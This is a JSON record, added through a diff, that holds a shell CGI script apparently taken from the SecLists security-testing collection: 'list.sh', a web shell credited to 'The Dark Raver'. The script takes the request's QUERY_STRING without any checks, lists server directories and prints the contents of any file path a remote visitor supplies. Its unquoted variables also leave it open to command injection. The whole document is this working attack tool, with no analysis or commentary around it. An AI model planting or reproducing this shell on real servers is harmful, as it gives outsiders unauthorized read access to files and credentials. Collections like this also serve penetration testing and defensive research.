@@ -1,0 +1,9 @@
+{
+  "source": "github",
+  "source_id": "github:danielmiessler/SecLists:Web-Shells/FuzzDB/list.sh",
+  "title": "danielmiessler/SecLists/Web-Shells/FuzzDB/list.sh",
+  "text": "#!/bin/sh\n#\n# SH_KIT\n#\n# list.sh = Directory & File Listing\n#\n# by: The Dark Raver\n# modified: 16/12/2005\n#\n\necho Content-Type: text/html\necho\n\nif [ \"$QUERY_STRING\" != \"\" ]\n  then\n  echo PATH: $QUERY_STRING \"<br><hr>\"\n  echo `ls $QUERY_STRING` > /tmp/test\n  else\n  echo PATH: / \"<br><hr>\"\n  echo > /tmp/test\n  QUERY_STRING=\"/\"\n  root=\"1\"\n  fi\n\nout=`grep \"/\" /tmp/test`\n\nif [ \"$out\" != \"\" ]\n  then\n    echo FICHERO: $QUERY_STRING\n    echo \"<hr><pre>\"\n    cat $QUERY_STRING\n  else\n    if [ \"$root\" != \"1\" ]\n      then\n      echo \"( ) <a href=?\"$QUERY_STRING\"/..>\"..\"</a><br>\"\n      fi\n    for i in `ls $QUERY_STRING`\n      do\n      if [ \"$root\" == \"1\" ] \n        then \n        echo \"( ) <a href=?/\"$i\">\"$i\"</a><br>\"\n        else \n        echo \"( ) <a href=?\"$QUERY_STRING\"/\"$i\">\"$i\"</a><br>\"\n        fi\n      done\n\n  fi",
+  "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/FuzzDB/list.sh",
+  "language": "shell",
+  "kind": "code"
+}
